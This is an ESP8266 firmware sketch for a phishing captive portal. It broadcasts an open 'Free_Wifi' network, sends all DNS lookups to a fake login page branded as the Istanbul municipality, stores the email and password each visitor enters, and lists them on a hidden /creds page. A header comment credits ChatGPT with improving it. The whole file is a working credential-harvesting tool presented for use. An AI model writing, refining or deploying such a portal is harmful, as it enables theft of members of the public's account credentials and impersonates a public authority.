// ESP8266 WiFi Captive Portal (Geliştirilmiş)
// By 125K + Düzenleme: Rüzgar (ChatGPT) - 2025

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

#define SSID_NAME "Free_Wifi"
#define SUBTITLE "Free_Wifi Service"
#define TITLE "Sign in"
#define BODY "Log in to your account to connect to the Internet."
#define POST_TITLE "Providing Connection..."
#define POST_BODY "Your account is being verified. Please wait a few minutes for your device to connect.<br>Thank you."
#define PASS_TITLE "Registered Logins"
#define CLEAR_TITLE "cleared"

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);

DNSServer dnsServer;
ESP8266WebServer webServer(80);

String data = "", Credentials = "";
int savedData = 0, timer = 5000, i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0;

void readData() {
  File file = LittleFS.open("/SavedFile.txt", "r");
  if (!file) return;
  data = "";
  int idx = 0;
  char arr[1000];
  while (file.available()) arr[idx++] = (char)file.read();
  arr[idx] = '\0';
  file.close();
  data = String(arr);
  if (data != "") savedData = 1;
  Credentials = data; // Güncel veriyi Credentials olarak da ata
}

void writeData(String data) {
  File file = LittleFS.open("/SavedFile.txt", "w");
  file.print(data);
  delay(1);
  file.close();
}

void deleteData() {
  LittleFS.remove("/SavedFile.txt");
  Credentials = "";
  data = "";
  savedData = 0;
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  return a.substring(0, 200);
}

String footer() {
  return "</article><div class=q><a>&#169; Istanbul Belediyesi</a></div></body></html>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = R"rawliteral(
    body {
      background: linear-gradient(to right, #1e1e2f, #121212);
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
                   Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    }
    nav {
      background-color: #151515;
      padding: 1em;
      text-align: center;
      border-bottom: 1px solid #333;
    }
    nav img {
      max-height: 50px;
      margin-bottom: 0.5em;
    }
    nav b {
      font-size: 1.8em;
      display: block;
    }
    article, form {
      background-color: #202020;
      padding: 2em;
      margin: 2em auto;
      max-width: 420px;
      border-radius: 16px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }
    h1 {
      text-align: center;
      font-size: 1.5em;
      margin-top: 0;
    }
    label {
      margin-top: 15px;
      display: block;
      font-weight: 600;
    }
    input[type=text], input[type=password], input[type=submit] {
      width: 100%;
      padding: 14px;
      margin: 8px 0 16px;
      border: none;
      border-radius: 8px;
      background-color: #2b2b2b;
      color: #f0f0f0;
    }
    input[type=submit] {
      background-color: #1e88e5;
      font-weight: bold;
      transition: background 0.3s ease;
    }
    input[type=submit]:hover {
      background-color: #1565c0;
    }
    .q {
      text-align: center;
      font-size: 0.85em;
      margin-top: 2em;
      color: #888;
    }
  )rawliteral";

  String h = "<!DOCTYPE html><html><head><title>" + a + " :: " + t + "</title>"
             "<meta charset='UTF-8'>"
             "<meta name=viewport content=\"width=device-width, initial-scale=1\">"
             "<style>" + CSS + "</style></head><body>"
             "<nav><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/b/bb/Istanbul_unofficial_logo.svg/320px-Istanbul_unofficial_logo.svg.png'><b>" + a + "</b><p>" + SUBTITLE + "</p></nav><article><h1>" + t + "</h1>";
  return h;
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</div><div><form action='/post' method='post'>" +
         "<label>Email:</label><input type='text' autocomplete='email' name='email'>" +
         "<label>Sifre:</label><input type='password' name='password'>" +
         "<input type='submit' value='Giris Yap'></form></div>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  readData();
  Credentials = data + "<li><b>Email:</b> " + email + "<br><b>Sifre:</b> " + password + "</li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header(POST_TITLE) + POST_BODY + footer();
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><center><a href='/'>Ana Sayfa</a> | <a href='/clear'>Temizle</a></center>" + footer();
}

String clear() {
  deleteData();
  return header(CLEAR_TITLE) + "<div><p>Veriler silindi.</p><center><a href='/'>Ana Sayfa</a></center></div>" + footer();
}

void BLINK() {
  for (int count = 0; count < 5; count++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
  }
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html; charset=UTF-8", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html; charset=UTF-8", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html; charset=UTF-8", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html; charset=UTF-8", index());
  });

  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount hatasi");
    delay(1000);
    return;
  }

  readData();
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) lastTick = millis();
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) i = 0;
}
